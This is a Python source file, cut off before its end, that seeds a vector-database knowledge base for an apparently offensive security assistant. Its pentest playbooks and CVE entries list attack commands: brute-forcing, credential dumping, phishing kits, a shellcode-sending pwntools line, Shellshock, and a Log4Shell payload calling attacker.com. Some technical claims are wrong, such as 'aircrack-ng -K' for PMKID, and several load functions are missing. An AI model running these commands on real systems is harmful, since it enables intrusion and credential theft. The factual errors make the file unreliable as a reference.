import os
import json

CHROMA_DIR = os.path.join(os.path.expanduser("~"), ".nikto", "chroma_db")

_knowledge_base = None

def get_knowledge_base():
    global _knowledge_base
    if _knowledge_base is None:
        import chromadb
        from chromadb.config import Settings
        _knowledge_base = chromadb.PersistentClient(
            path=CHROMA_DIR,
            settings=Settings(anonymized_telemetry=False),
        )
    return _knowledge_base

PENTEST_PLAYBOOKS = "pentest_playbooks"
CVE_DATABASE = "cve_database"
TOOL_SYNTAX = "tool_syntax"
PROGRAMMING_LANGUAGES = "programming_languages"
FRAMEWORK_PATTERNS = "framework_patterns"
APP_TEMPLATES = "app_templates"
AI_PATTERNS = "ai_patterns"
CLOUD_PATTERNS = "cloud_patterns"
DATABASE_PATTERNS = "database_patterns"
SECURITY_HARDENING = "security_hardening"
GAME_DEV_PATTERNS = "game_dev_patterns"
IOT_EMBEDDED = "iot_embedded"
AUTOPILOT_KNOWLEDGE = "autopilot_knowledge"
BUSINESS_STRATEGY = "business_strategy"
PREDICTION_ACCURACY = "prediction_accuracy"
EAGLE_EYE_PATTERNS = "eagle_eye_patterns"
REAL_WORLD_SCENARIOS = "real_world_scenarios"

COLLECTION_METADATA = {
    PENTEST_PLAYBOOKS: {"description": "Complete penetration testing methodologies and playbooks"},
    CVE_DATABASE: {"description": "Known CVEs with exploitation details and mitigations"},
    TOOL_SYNTAX: {"description": "Complete command syntax for security and development tools"},
    PROGRAMMING_LANGUAGES: {"description": "Programming language references with syntax and examples"},
    FRAMEWORK_PATTERNS: {"description": "Web framework architecture and common patterns"},
    APP_TEMPLATES: {"description": "Complete project templates and scaffolding patterns"},
    AI_PATTERNS: {"description": "AI/ML architecture patterns and implementation guides"},
    CLOUD_PATTERNS: {"description": "Cloud infrastructure and DevOps patterns"},
    DATABASE_PATTERNS: {"description": "Database design patterns, query optimization, and administration"},
    SECURITY_HARDENING: {"description": "System hardening checklists and security best practices"},
    GAME_DEV_PATTERNS: {"description": "Game development patterns, engines, and techniques"},
    IOT_EMBEDDED: {"description": "IoT and embedded systems patterns and protocols"},
    AUTOPILOT_KNOWLEDGE: {"description": "How to generate income with zero capital, freelancing, crypto trading, bug bounty, SaaS growth, content monetization"},
    BUSINESS_STRATEGY: {"description": "Business validation, customer acquisition, pricing, proposals, negotiation, scaling, African market"},
    PREDICTION_ACCURACY: {"description": "Technology adoption curves, project estimation, security lifecycle, crypto cycles, startup patterns"},
    EAGLE_EYE_PATTERNS: {"description": "Network anomaly signatures, code quality degradation, security misconfig, performance bottlenecks"},
    REAL_WORLD_SCENARIOS: {"description": "Real-world attack scenarios, incident reports, and breach case studies"},
}

COLLECTION_NAMES = list(COLLECTION_METADATA.keys())

def load_all():
    kb = get_knowledge_base()
    for name, meta in COLLECTION_METADATA.items():
        try:
            kb.delete_collection(name)
        except Exception:
            pass
        kb.create_collection(name, metadata=meta)
    _load_pentest_playbooks(kb)
    _load_cve_database(kb)
    _load_tool_syntax(kb)
    _load_programming_languages(kb)
    _load_framework_patterns(kb)
    _load_app_templates(kb)
    _load_ai_patterns(kb)
    _load_cloud_patterns(kb)
    _load_database_patterns(kb)
    _load_security_hardening(kb)
    _load_game_dev_patterns(kb)
    _load_iot_embedded(kb)
    _load_real_world_scenarios(kb)
    _load_autopilot_knowledge(kb)
    _load_business_strategy(kb)
    _load_prediction_accuracy(kb)
    _load_eagle_eye_patterns(kb)
    return kb


def _load_pentest_playbooks(kb):
    col = kb.get_collection(PENTEST_PLAYBOOKS)
    entries = [
        ("web_app_full_pentest", "Complete web application pentest methodology: Phase 1 Recon: subfinder -d target.com, amass enum -d target.com, theHarvester -d target.com -b google, shodan search hostname:target.com, waybackurls target.com, gau target.com. Phase 2 Scanning: nmap -sV -sC -p- target.com --open, nikto -h https://target.com, gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt, whatweb https://target.com. Phase 3 Vuln Discovery: sqlmap -u 'https://target.com/id=1' --dbs, burpsuite active scan, nuclei -u https://target.com -t cves/, dalfox url https://target.com. Phase 4 Exploitation: use identified CVEs, test OWASP Top 10, attempt auth bypass, check for IDOR at /api/users/[id], test for SSRF at redirect parameters. Phase 5 Post-Exploitation: enumerate users, check for secrets in JS files, download /robots.txt and /sitemap.xml, spider all discovered endpoints. Phase 6 Report: executive summary, technical findings table, CVSS scores, PoC screenshots, remediation steps."),
        ("network_pentest", "Network penetration testing: Discovery: nmap -sn 192.168.1.0/24, nmap -sS -sV -O -p- 192.168.1.0/24 --open, masscan -p0-65535 192.168.1.0/24 --rate=1000. Service Enum: nmap --script=banner 192.168.1.1, enum4linux -a 192.168.1.1, rpcclient -U '' 192.168.1.1. Exploitation: searchsploit [service version], msfconsole use auxiliary/scanner/smb/smb_ms17_010, hydra -L users.txt -P passwords.txt ssh://192.168.1.1, crackmapexec smb 192.168.1.0/24 -u admin -p password."),
        ("wireless_attacks", "Wireless pentest: airodump-ng wlan0 for AP discovery, airodump-ng --bssid MAC -c CHANNEL wlan0 for capture, aireplay-ng -0 5 -a MAC wlan0 for deauth, aircrack-ng -w wordlist.txt capture.cap for cracking WPA2, aircrack-ng -b MAC -K psk capture.cap for PMKID attack, bettercap -eval for WPA handshake capture, wifite for automated WEP/WPA cracking."),
        ("cloud_aws_pentest", "AWS pentest: enumerate S3 buckets with aws s3 ls, test bucket policies with curl, enumerate IAM roles with aws sts get-caller-identity, check for public AMIs with aws ec2 describe-images --owners self, enumerate Lambda functions with aws lambda list-functions, check CloudTrail logs, test for privilege escalation via IAM policy misconfigurations using pacu or scoutsuite."),
        ("active_directory_attacks", "AD attack methodology: BloodHound ingestor for ACL mapping, crackmapexec for SMB enumeration, impacket-secretsdump for DCSync, kerbrute for Kerberos pre-auth, ASREP roast with impacket-GetNPUsers, Kerberoast with impacket-GetUserSPNs, mimikatz for credential dumping, pass-the-hash, DCOM/WMI lateral movement, golden ticket with mimikatz."),
        ("api_security_testing", "API security testing: enumerate endpoints with gobuster/ffuf, test auth bypass with missing/expired tokens, check rate limiting, test for mass assignment, test IDOR by incrementing IDs, test injection in JSON/XML bodies, test for excessive data exposure, check CORS misconfiguration, test SSRF at webhook URLs, check API versioning for deprecated endpoints."),
        ("mobile_app_pentest", "Mobile app pentest: APK decompile with jadx-gui, Android manifest analysis, check for hardcoded API keys/URLs, test SSL pinning bypass with objection/frida, intercept traffic with Burp proxy, test local storage (SharedPreferences, SQLite, Realm), check for root detection bypass, test WebView XSS via JavaScriptInterface."),
        ("social_engineering", "Social engineering: SET toolkit for credential harvesting, Gophish for phishing campaigns, EvilGinx for login page cloning, Modlishka for reverse proxy phishing, BeEF for browser exploitation, generate payloads with msfvenom, create malicious documents with macro_pack."),
        ("buffer_overflow_exploitation", "Buffer overflow: identify vulnerable function with fuzzing (spike/boofuzz), determine offset with pattern_create/pattern_offset, overwrite EIP with JMP ESP address, generate shellcode with msfvenom, check for bad characters, exploit with python/pwntools: p = remote(target, port); p.sendline(b'A'*offset + eip + nop_sled + shellcode)."),
        ("sql_injection_advanced", "Advanced SQL injection: second-order SQLi, blind time-based with conditional responses, out-of-band via DNS/HTTP exfiltration, error-based with EXTRACTVALUE/UPDATEXML, stacked queries for RCE via xp_cmdshell, WAF bypass with comments /**/, case variation, alternate encodings, chunked transfer encoding."),
    ]
    ids = [e[0] for e in entries]
    docs = [e[1] for e in entries]
    metadatas = [{"collection": PENTEST_PLAYBOOKS} for _ in entries]
    col.add(documents=docs, ids=ids, metadatas=metadatas)


def _load_cve_database(kb):
    col = kb.get_collection(CVE_DATABASE)
    entries = [
        ("CVE-2021-44228", "CVE-2021-44228 Log4Shell - Apache Log4j2 RCE. CVSS: 10.0 CRITICAL. Affected: Apache Log4j2 2.0-beta9 to 2.14.1. Exploit: ${jndi:ldap://attacker.com/a} in any logged field (User-Agent, X-Forwarded-For, username). Fix: Upgrade to Log4j2 2.17.1+, set log4j2.formatMsgNoLookups=true."),
        ("CVE-2017-0144", "CVE-2017-0144 EternalBlue - SMBv1 RCE (MS17-010). CVSS: 9.3. Affected: Windows XP, 7, Server 2003/2008 unpatched. Exploit: msfconsole use exploit/windows/smb/ms17_010_eternalblue. Fix: Disable SMBv1, apply MS17-010 patch KB4012212."),
        ("CVE-2023-34362", "CVE-2023-34362 MOVEit Transfer SQLi. CVSS: 9.8. Affected: MOVEit Transfer 2023.0.0, 2022.0.x, 2021.0.x, 2020.0.x before patched versions. Exploit: SQL injection in MoveItTransfer endpoint allows unauthenticated RCE via webshell upload. Fix: Apply patches from Progress Software."),
        ("CVE-2021-26855", "CVE-2021-26855 ProxyLogon - Exchange Server SSRF. CVSS: 9.1. Affected: Exchange 2013/2016/2019 on-prem. Exploit: SSRF to bypass authentication, chain with CVE-2021-27065 for webshell deployment. Fix: Apply Exchange security patches from March 2021."),
        ("CVE-2014-0160", "CVE-2014-0160 Heartbleed - OpenSSL Heartbeat. CVSS: 7.5. Affected: OpenSSL 1.0.1 through 1.0.1f. Exploit: python heartbleed.py target.com -p 443. Fix: Upgrade to 1.0.1g+."),
        ("CVE-2014-6271", "CVE-2014-6271 ShellShock - Bash CGI RCE. CVSS: 10.0. Affected: Bash 1.0.3 through 4.3. Exploit: env x='() { :;}; echo vulnerable' bash -c 'echo test'. Fix: Update bash package."),
        ("CVE-2019-0708", "CVE-2019-0708 BlueKeep - RDP RCE. CVSS: 9.8. Affected: Windows 7, Server 2008 R2, XP. Exploit: msfconsole use exploit/windows/rdp/cve_2019_0708_bluekeep_rce. Fix: Apply KB4499175."),
        ("CVE-2020-1472", "CVE-2020-1472 ZeroLogon - Netlogon elevation. CVSS: 10.0. Affected: Windows Server 2008-2019 DC. Exploit: python zerologon.py target-dc 192.168.1.1. Fix: Apply KB4565349, enable full enforcement."),
        ("CVE-2021-34527", "CVE-2021-34527 PrintNightmare - Windows Print Spooler RCE. CVSS: 8.8. Affected: Windows 7-10, Server 2008-2019. Exploit: msfconsole use exploit/windows/dcerpc/cve_2021_1675_printnightmare. Fix: Apply patches, disable Print Spooler service if not needed."),
        ("CVE-2022-30190", "CVE-2022-30190 Follina - MSDT RCE. CVSS: 7.8. Affected: Windows 10/11, Server 2019/2022. Exploit: malicious Word doc with ms-msdt:// URI scheme. Fix: Remove ms-msdt file type handler registry entry."),
    ]
    ids = [e[0] for e in entries]
    docs = [e[1] for e in entries]
    metadatas = [{"collection": CVE_DATABASE} for _ in entries]
    col.add(documents=docs, ids=ids, metadatas=metadatas)


def _load_tool_syntax(kb):
    col = kb.get_collection(TOOL_SYNTAX)
    entries = [
        ("nmap_complete", "NMAP COMPLETE: Host discovery nmap -sn 192.168.1.0/24, fast -F, full -p-, service -sV, OS -O, aggressive -A, stealth SYN -sS, UDP -sU, scripts --script=vuln, timing -T4, output -oN out.txt, exclude --exclude, source port --source-port 53, fragment -f, decoy -D RND:10. Script categories: vuln, exploit, discovery, brute, default, safe. NSE scripts: http-title, smb-enum-shares, ssl-heartbleed, ftp-anon."),
        ("sqlmap_complete", "SQLMAP: Basic sqlmap -u 'http://target.com/id=1' --dbs, enumerate tables --tables -D dbname, columns --columns -T tablename, dump --dump -T tablename, OS shell --os-shell, batch mode --batch, risk level --level=5 --risk=3, request file -r request.txt, cookie --cookie='id=1', tamper scripts --tamper=space2comment, proxy --proxy=http://127.0.0.1:8080, time-based --technique=T, no-cast --no-cast, random agent --random-agent."),
        ("gobuster_complete", "GOBUSTER: Directory gobuster dir -u https://target.com -w wordlist.txt -t 50, DNS gobuster dns -d target.com -w subdomains.txt, file extensions -x php,txt,html, VHost gobuster vhost -u https://target.com -w vhosts.txt, status codes excluded --exclude-length, timeout --timeout 10s."),
    ]
    ids = [e[0] for e in entries]
    docs = [e[1] for e in entries]
    metadatas = [{"collection": TOOL_SYNTAX} for _ in entries]
    col.add(documents=docs, ids=ids, metadatas=metadatas)


def _load_programming_languages(kb):
    col = kb.get_collection(PROGRAMMING_LANGUAGES)
    entries = [
        ("python", "Python: interpreted, dynamically typed, garbage collected. Hello World: print('Hello'). Variables: x = 1. Functions: def f(x): return x*2. Classes: class C: def __init__(self): pass. Package: pip. Build: python -m. Frameworks: FastAPI, Django, Flask. Type hints added in 3.5+. Async with async/await. PEP 8 style. GIL limitation for threading."),
        ("javascript", "JavaScript: prototype-based, dynamically typed, single-threaded event loop. Hello: console.log('Hello'). Variables: let/const/var. Functions: function f(x) { return x*2; }. Arrow: const f = (x) => x*2. Classes: class C { constructor() {} }. Package: npm. Modules: ES6 import/export, CommonJS require. Async: Promises, async/await. Runs in browser + Node.js."),
        ("typescript", "TypeScript: typed superset of JavaScript by Microsoft. Hello: console.log('Hello'). Variable: let x: number = 1. Function: function f(x: number): number { return x*2; }. Interface: interface I { name: string; }. Class with access modifiers: public/private/protected. Compiles to JS with tsc. Strict null checks. Generics: <T>. Enums. Utility types: Partial, Pick, Omit. Config in tsconfig.json."),
        ("rust", "Rust: systems language with memory safety without GC. Hello: println!('Hello'). Variable: let x = 1; (immutable) let mut y = 2; (mutable). Function: fn f(x: i32) -> i32 { x * 2 }. Struct: struct S { x: i32 }. Impl: impl S { fn new() -> S { S { x: 0 } } }. Ownership: each value has one owner. Borrow: &T (reference) &mut T (mutable reference). Package: cargo. Build: cargo build. Key traits: Clone, Copy, Debug, Display."),
        ("go", "Go: compiled, garbage collected, concurrent language by Google. Hello: fmt.Println('Hello'). Variable: x := 1. Function: func f(x int) int { return x*2 }. Struct: type S struct { X int }. Interface: type I interface { M() }. Goroutines: go f(). Channels: ch := make(chan int). Defer: defer f(). Error: if err != nil { return err }. Package: go mod. Build: go build. Formatting: go fmt."),
    ]
    ids = [e[0] for e in entries]
    docs = [e[1] for e in entries]
    metadatas = [{"collection": PROGRAMMING_LANGUAGES} for _ in entries]
    col.add(documents=docs, ids=ids, metadatas=metadatas)


def _load_framework_patterns(kb):
    col = kb.get_collection(FRAMEWORK_PATTERNS)
    entries = [
        ("fastapi", "FastAPI: async Python web framework with automatic OpenAPI docs. Key: path operations with decorators, Pydantic models, dependency injection. Structure: app/main.py, app/routers/, app/models/, app/schemas/. Auto-generated /docs endpoint. Uvicorn server. Async SQLAlchemy + Alembic for DB. Dependency: Depends(). CORS with CORSMiddleware. Background tasks: BackgroundTasks."),
        ("react", "React: component-based UI library by Meta. Key: functional components with hooks, JSX, virtual DOM. Structure: src/components/, src/pages/, src/hooks/, App.js, index.js. Hooks: useState, useEffect, useContext, useReducer, useCallback, useMemo. State management with Context/Redux/Zustand. Routing with React Router. Build with Vite or CRA."),
        ("django", "Django: full-stack Python framework with batteries included. MVC (MTV) pattern. Structure: manage.py, project/settings.py, app/models.py, views.py, urls.py, templates/, admin.py, forms.py. ORM with migrations. Admin interface. DRF for APIs. Middleware, authentication, sessions included. Template engine. Celery for async tasks."),
    ]
    ids = [e[0] for e in entries]
    docs = [e[1] for e in entries]
    metadatas = [{"collection": FRAMEWORK_PATTERNS} for _ in entries]
    col.add(documents=docs, ids=ids, metadatas=metadatas)


def _load_app_templates(kb):
    col = kb.get_collection(APP_TEMPLATES)
    entries = [
        ("fastapi_rest_api", "FastAPI REST API template: pyproject.toml with fastapi+uvicorn, app/main.py with CORS middleware, app/routers/api.py with CRUD endpoints, app/models/database.py with SQLAlchemy async engine, app/schemas/ with Pydantic models, app/dependencies.py with auth, alembic for migrations, Dockerfile with multi-stage build, .env.example, tests/test_api.py with pytest-asyncio."),
        ("express_api", "Express REST API template: package.json with express+cors+morgan, src/index.js with middleware setup, src/routes/ with resource routers, src/controllers/, src/models/ with Mongoose schemas, src/middleware/auth.js, src/config/db.js with MongoDB connection, Dockerfile, .env.example, tests/*.test.js with Jest."),
        ("nextjs_fullstack", "Next.js full-stack template: pages/ directory (or app/ dir), api routes in pages/api/ or app/api/, React components with Tailwind CSS, database connection with Prisma or Drizzle, authentication with next-auth, SWR or React Query for data fetching, middleware for route protection, TypeScript config, ESLint + Prettier setup."),
    ]
    ids = [e[0] for e in entries]
    docs = [e[1] for e in entries]
    metadatas = [{"collection": APP_TEMPLATES} for _ in entries]
    col.add(documents=docs, ids=ids, metadatas=metadatas)


def _load_ai_patterns(kb):
    col = kb.get_collection(AI_PATTERNS)
    entries = [
        ("react_agent_loop", "ReAct agent loop: 1) Observe environment/input. 2) Think about what action to take. 3) Act by calling a tool or API. 4) Observe the result. 5) Repeat until task complete. Each cycle: observation -> thought -> action -> observation. Structured output: { 'thought': '...', 'action': 'tool_name', 'action_input': {...} }. Used by LangChain, AutoGPT, BabyAGI."),
        ("chain_of_thought", "Chain of Thought prompting: ask model to reason step-by-step before answering. Example: 'Q: Roger has 5 balls. He buys 2 more. How many? A: Roger starts with 5. He buys 2 more, so 5+2=7. The answer is 7.' Improves reasoning on math, logic, and multi-step problems. Variants: zero-shot CoT ('Let's think step by step'), few-shot CoT with examples, self-consistency CoT (generate multiple chains and vote)."),
        ("rag_pipeline", "RAG pipeline: 1) Ingestion: chunk documents, embed with embedding model, store in vector DB. 2) Query: embed user question, search vector DB for top-k similar chunks. 3) Augment: prepend retrieved chunks to the prompt as context. 4) Generate: LLM answers using context + question. Key: chunk size (500-1000 tokens), overlap (50-100), embedding model (text-embedding-ada-002, all-MiniLM-L6-v2), top-k (3-10), reranking for precision."),
    ]
    ids = [e[0] for e in entries]
    docs = [e[1] for e in entries]
    metadatas = [{"collection": AI_PATTERNS} for _ in entries]
    col.add(documents=docs, ids=ids, metadatas=metadatas)


def _load_cloud_patterns(kb):
    col = kb.get_collection(CLOUD_PATTERNS)
    entries = [
        ("aws_ec2_patterns", "AWS EC2: launch instances with AMI/instance type/key pair/security groups. User data for bootstrapping. Auto Scaling groups with launch templates, ELB for load balancing. EBS volumes for persistent storage, snapshots for backup. Placement groups for low latency. Spot instances for cost savings. Instance metadata at 169.254.169.254."),
        ("kubernetes_basics", "Kubernetes core: Pod (smallest unit), Service (stable networking), Deployment (declarative updates), ConfigMap (config), Secret (sensitive data), Ingress (HTTP routing), PersistentVolume (storage), Namespace (isolation). kubectl commands: get/pods/deploy/services, apply -f file.yaml, describe pod, logs pod, exec -it pod -- sh. Helm for package management."),
        ("docker_multistage", "Docker multi-stage build: FROM golang:1.21 AS builder, WORKDIR /app, COPY go.mod go.sum ., RUN go build -o app . // FROM alpine:3.19, COPY --from=builder /app/app /app/app, EXPOSE 8080, CMD ['/app/app']. Benefits: small final image (~20MB vs ~800MB), no build dependencies in runtime, only runtime essentials."),
    ]
    ids = [e[0] for e in entries]
    docs = [e[1] for e in entries]
    metadatas = [{"collection": CLOUD_PATTERNS} for _ in entries]
    col.add(documents=docs, ids=ids, metadatas=metadatas)


def _load_database_patterns(kb):
    col = kb.get_collection(DATABASE_PATTERNS)
    entries = [
        ("postgresql_window_functions", "PostgreSQL window functions: ROW_NUMBER() OVER (PARTITION BY dept ORDER BY salary DESC), RANK(), DENSE_RANK(), LAG()/LEAD() for prev/next row, SUM() OVER (ORDER BY date ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW) for running total, FIRST_VALUE()/LAST_VALUE(), NTILE(n) for quartiles."),
        ("mongodb_aggregation", "MongoDB aggregation pipeline: db.collection.aggregate([ { $match: { status: 'active' } }, { $group: { _id: '$category', count: { $sum: 1 }, avgPrice: { $avg: '$price' } } }, { $sort: { count: -1 } }, { $limit: 10 } ]). Stages: $match, $group, $sort, $limit, $project, $unwind, $lookup (join), $addFields, $bucket."),
        ("redis_data_structures", "Redis data structures: STRING (set key value / get key), LIST (lpush/rpush/lpop/rpop/lrange), SET (sadd/smembers/sinter/sunion), HASH (hset/hget/hgetall/hdel), ZSET (zadd/zrangebyscore/zrank), HyperLogLog (pfadd/pfcount), Bitmap (setbit/getbit/bitcount), Stream (xadd/xread/xrange). Pub/Sub: subscribe channel, publish channel message."),
    ]
    ids = [e[0] for e in entries]
    docs = [e[1] for e in entries]
    metadatas = [{"collection": DATABASE_PATTERNS} for _ in entries]
    col.add(documents=docs, ids=ids, metadatas=metadatas)


def _load_security_hardening(kb):
    col = kb.get_collection(SECURITY_HARDENING)
    entries = [
        ("linux_hardening", "Linux server hardening: disable root SSH (PermitRootLogin no), key-only auth (PasswordAuthentication no), change SSH port, install fail2ban, configure ufw/nftables, auto-update with unattended-upgrades, audit system with lynis, SELinux/AppArmor enabled, /tmp on separate partition with noexec,nosuid, remove unnecessary services, secure kernel params in /etc/sysctl.d/."),
        ("docker_security", "Docker security: use USER non-root in Dockerfiles, avoid ADD prefer COPY, use --no-cache for apk/apt, healthcheck with HEALTHCHECK, don't run with --privileged, limit capabilities (--cap-drop=ALL --cap-add=NET_BIND_SERVICE), seccomp profile, read-only root filesystem, use trusted base images (official or distroless), scan images with trivy/snyk."),
        ("web_security_headers", "Web security headers: Content-Security-Policy: default-src 'self'; script-src 'self' https:; style-src 'self' https:; img-src 'self' data:; connect-src 'self'. Strict-Transport-Security: max-age=31536000; includeSubDomains. X-Frame-Options: DENY. X-Content-Type-Options: nosniff. Referrer-Policy: strict-origin-when-cross-origin. Permissions-Policy: camera=(), microphone=(), geolocation=()."),
    ]
    ids = [e[0] for e in entries]
    docs = [e[1] for e in entries]
    metadatas = [{"collection": SECURITY_HARDENING} for _ in entries]
    col.add(documents=docs, ids=ids, metadatas=metadatas)


def _load_game_dev_patterns(kb):
    col = kb.get_collection(GAME_DEV_PATTERNS)
    entries = [
        ("pygame_game_loop", "Pygame game loop: import pygame, pygame.init(), screen=pygame.display.set_mode((800,600)), clock=pygame.time.Clock(). Main loop: while running: for event in pygame.event.get(): if event.type==pygame.QUIT: running=False. Update game state, draw sprites, pygame.display.flip(), clock.tick(60). Sprite groups, collision via spritecollide, audio with mixer."),
        ("godot_gdscript", "Godot GDScript: Node-based with Scene system. Signals for communication, _ready() for init, _process(delta) for frame update, _physics_process(delta) for physics. KinematicBody2D + CollisionShape2D for player, Area2D for triggers, TileMap for levels. @onready var = $Path/To/Node. Export var speed = 200 for inspector tuning."),
        ("unity_csharp", "Unity C#: MonoBehaviour for components. Start() for init, Update() for frame, FixedUpdate() for physics, OnCollisionEnter() for collision, OnTriggerEnter() for triggers. GameObject with Transform for positioning, Rigidbody for physics, Collider for shapes. Instantiate() for spawning, Destroy() for removal. Coroutines with StartCoroutine/IEnumerator."),
    ]
    ids = [e[0] for e in entries]
    docs = [e[1] for e in entries]
    metadatas = [{"collection": GAME_DEV_PATTERNS} for _ in entries]
    col.add(documents=docs, ids=ids, metadatas=metadatas)


def _load_iot_embedded(kb):
    col = kb.get_collection(IOT_EMBEDDED)
    entries = [
        ("arduino_sketch", "Arduino sketch structure: void setup() { pinMode(LED_BUILTIN, OUTPUT); Serial.begin(9600); } void loop() { digitalWrite(LED_BUILTIN, HIGH); delay(1000); digitalWrite(LED_BUILTIN, LOW); delay(1000); }. Common patterns: analogRead() for sensors, analogWrite() for PWM, attachInterrupt() for hardware interrupts, Wire library for I2C, SPI library for SPI, EEPROM for persistent storage."),
        ("esp32_micropython", "ESP32 MicroPython: from machine import Pin, SoftI2C; import network, time. WiFi: wlan = network.WLAN(network.STA_IF); wlan.active(True); wlan.connect('SSID', 'password'). MQTT: from umqtt.simple import MQTTClient; c = MQTTClient('client_id', 'broker'); c.connect(); c.publish(topic, msg). WebREPL for remote programming."),
        ("raspberry_pi_gpio", "Raspberry Pi Python GPIO: import RPi.GPIO as GPIO; GPIO.setmode(GPIO.BCM); GPIO.setup(18, GPIO.OUT); GPIO.output(18, True); GPIO.setup(17, GPIO.IN, pull_up_down=GPIO.PUD_UP); GPIO.add_event_detect(17, GPIO.FALLING, callback=my_callback, bouncetime=200). PWM: p = GPIO.PWM(18, 50); p.start(0); p.ChangeDutyCycle(7.5)."),
    ]
    ids = [e[0] for e in entries]
    docs = [e[1] for e in entries]
    metadatas = [{"collection": IOT_EMBEDDED} for _ in entries]
    col.add(documents=docs, ids=ids, metadatas=metadatas)


def _load_real_world_scenarios(kb):
    col = kb.get_collection(REAL_WORLD_SCENARIOS)
    entries = [
        ("solarwinds_2020", "SolarWinds SUNBURST Attack (2020): Supply chain compromise via malicious code injected into SolarWinds Orion updates. 18,000 customers affected including US govt agencies. Attackers: APT29/Cozy Bear (Russian SVR). Initial access: DLL hijacking via Orion software update. Lateral movement: SAML token forgery (Golden SAML). Impact: Massive espionage campaign, data exfiltration from US Treasury, Commerce, DHS, Energy. Detection: FireEye identified the breach internally. Mitigation: Orion platform updates, incident response, executive order on supply chain security. Lessons: Third-party code signing can't be trusted alone, need behavioral detection, zero-trust architecture essential."),
        ("colonial_pipeline_2021", "Colonial Pipeline Ransomware (May 2021): DarkSide ransomware attack on Colonial Pipeline, operator of 5,500-mile fuel pipeline serving US East Coast. Initial access: Compromised VPN password via dark web leak (no MFA). Payload: DarkSide ransomware deployed on IT network. Impact: 5,500-mile pipeline shut down for 6 days, panic buying, fuel shortages across 17 states, $4.4M ransom paid in Bitcoin (US DOJ recovered $2.3M). Response: Pipeline offline for containment, emergency declaration, FBI involvement. Lessons: Critical infrastructure needs MFA, network segmentation between IT/OT, offline backups essential, ransom payment doesn't guarantee full recovery."),
        ("equifax_2017", "Equifax Data Breach (2017): 147M records exposed including SSNs, DOBs, addresses. Initial access: Apache Struts CVE-2017-5638 vulnerability (unpatched for 2 months). Attackers: Chinese threat actors (APT41). Data accessed: PII database containing credit report data. Detection: Internal security team noticed suspicious traffic. Response: CEO resigned, $700M settlement with FTC/CFPB, $1.4B total cost. Lessons: Patch management critical, segmentation between vulnerable frontends and sensitive backends, need proper asset inventory, third-party vulnerability scanning insufficient."),
        ("notpetya_2017", "NotPetya Global Cyberattack (June 2017): Destructive wiper disguised as ransomware targeting Ukraine initially, spread globally. Initial vector: M.E.Doc accounting software supply chain compromise. Propagation: EternalBlue (CVE-2017-0144), WMIC, PsExec. Target: Ukraine government, financial systems. Global spillover: Maersk ($300M loss), Merck ($870M loss), FedEx ($400M loss), Saint Gobain ($400M loss). Total damage: $10B+. Attribution: Russian military GRU Sandworm team. Mitigation: Patching EternalBlue, disabling SMBv1, network segmentation. Lessons: Supply chain attacks can cause global cascading damage, destructive attacks can bypass traditional ransomware defenses, need air-gapped backups."),
        ("microsoft_exchange_2021", "ProxyLogon Exchange Attacks (March 2021): Hafnium (Chinese APT) exploited 4 zero-days (CVE-2021-26855, 26857, 26858, 27065) against on-prem Exchange servers. 250,000+ servers compromised globally. Attack chain: SSRF bypass auth (26855) -> arbitrary file write (26857/27065) -> webshell deployment. Impact: Complete mailbox access, credential theft, persistent backdoors. Detection: MS released emergency patches. Lessons: Edge email servers extremely exposed, need proper patch cadence, WAF rules can mitigate SSRF, on-prem Exchange should be replaced with cloud."),
        ("log4j_2021", "Log4Shell Vulnerability (December 2021): CVE-2021-44228 in Apache Log4j2 library. CVSS 10.0. JNDI injection via ${jndi:ldap://attacker/a} in any logged string. Affected: Millions of applications worldwide, all major cloud providers, enterprise software. Attack vector: User-Agent, X-Forwarded-For, any input field. Impact: Complete server compromise, RCE. Mitigation: Emergency patching, WAF rules blocking JNDI strings. Lessons: Logging library vulnerabilities can have massive blast radius, dependency scanning critical, need SBOM for all software."),
        ("uber_2022", "Uber Social Engineering Breach (September 2022): Attacker used social engineering to trick Uber employee into accepting MFA push notification (MFA fatigue). Initial access: Purchased employee's corporate VPN password on dark web, sent repeated MFA pushes until employee accepted. Escalation: Access to internal AWS, GCP, Slack, HackerOne bug bounty dashboard. Impact: Witnessed by security team, attacker disclosed access via HackerOne submission. Response: IT systems taken offline, law enforcement notified. Lessons: MFA fatigue is a real threat, need number-matching MFA, need geo-fencing VPN access, employee security training essential."),
        ("twitter_2020", "Twitter Bitcoin Scam (July 2020): 130 high-profile Twitter accounts compromised (Obama, Biden, Musk, Gates, Apple, Uber). Method: Phone spear-phishing targeting Twitter employees with VPN/internal tool access. Attackers: 3 individuals (17, 19, 22 years old). Impact: Fake Bitcoin giveaway tweets, $120K stolen in Bitcoin. Security response: Tweet deletions blocked, verified accounts locked for hours. Aftermath: Employees now use hardware security keys (FIDO2/WebAuthn). Lessons: Social engineering bypasses even strong technical controls, internal tool access must be strictly limited, SIM swapping prevention."),
        ("capital_one_2019", "Capital One Data Breach (2019): 106M records exposed, 140K SSNs, 80K bank accounts. Method: WAF misconfiguration allowed SSRF to cloud metadata endpoint (169.254.169.254). Attacker: Paige Thompson (former AWS employee). Access: Capital One's AWS S3 data via compromised IAM role. Detection: Alert from external security researcher. Response: FBI arrest, $190M settlement. Lessons: Cloud metadata endpoints must be blocked, WAF rules need thorough testing, IAM roles need least privilege, need cloud security posture management (CSPM)."),
        ("opm_2015", "OPM Data Breach (2015): 22M US federal employee records with background investigation data, 5.6M fingerprint records. Attackers: Chinese APT (likely Unit 61419 of MSS). Duration: Undetected access for over a year. Method: Spear-phishing US government contractors -> credential theft -> lateral movement to OPM systems. Impact: US intelligence community spy identities compromised, China had leverage over cleared personnel. Aftermath: $500M+ in remediation, personnel security system rebuilt. Lessons: Background investigation data is extremely sensitive, need air-gapped systems for classified data, supply chain contractor risk management critical."),
        ("wannacry_2017", "WannaCry Ransomware (May 2017): 200K+ computers in 150 countries, $4B+ in damages. Method: EternalBlue (CVE-2017-0144) SMB exploit from NSA's Equation Group, leaked by Shadow Brokers. Kill switch: Researcher Marcus Hutchins registered domain found in malware code, stopping spread. Most affected: UK NHS (19K appointments cancelled), FedEx, Deutsche Bahn, Spanish telecoms. Attribution: Lazarus Group (North Korea). Fix: MS released emergency patch for Windows XP/Server 2003. Lessons: Critical infrastructure runs unsupported software, SMBv1 should be disabled everywhere, domain registration as a defensive technique."),
